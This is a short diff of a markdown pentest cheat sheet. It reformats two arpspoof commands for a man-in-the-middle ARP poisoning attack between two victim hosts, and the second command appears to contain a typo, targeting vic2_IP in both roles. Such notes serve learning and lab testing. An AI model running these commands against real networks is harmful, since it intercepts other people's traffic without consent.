@@ -76,5 +76,5 @@
 ### 5.Sniffing
 
 #### 5.1 MiTM between vtcim1 & victm2 using arp poisonning
-    * arpspoof -i tap0 -t vic1_IP -r vic2_IP
-    * arpspoof -i tap0 -t vic2_IP -r vic2_IP
+    arpspoof -i tap0 -t vic1_IP -r vic2_IP
+    arpspoof -i tap0 -t vic2_IP -r vic2_IP
